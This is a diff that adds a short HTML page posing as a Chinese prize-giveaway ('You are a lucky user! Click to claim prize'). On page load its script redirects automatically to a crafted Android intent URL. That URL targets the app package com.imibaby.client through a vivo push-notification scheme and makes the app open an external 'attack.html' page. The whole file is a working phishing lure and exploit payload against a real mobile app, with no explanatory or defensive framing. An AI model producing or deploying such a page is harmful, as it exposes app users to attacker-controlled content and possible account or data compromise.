@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>你是幸运用户！</title>
+</head>
+<body>
+    <h1>点击领取奖品</h1>
+    <script>
+        var exploit_url = "https://junwensu.github.io/webview.mi.com/attack.html";
+        var content_json = JSON.stringify({"url": exploit_url});
+        var intent_url = "intent://com.vivo.push.notifysdk/detail#Intent;" +
+                         "scheme=vpushscheme;" +
+                         "package=com.imibaby.client;" +
+                         "S.Type=FindWeb;" +
+                         "S.Content=" + encodeURIComponent(content_json) + ";" +
+                         "end";
+        window.location.href = intent_url;
+    </script>
+</body>
+</html>
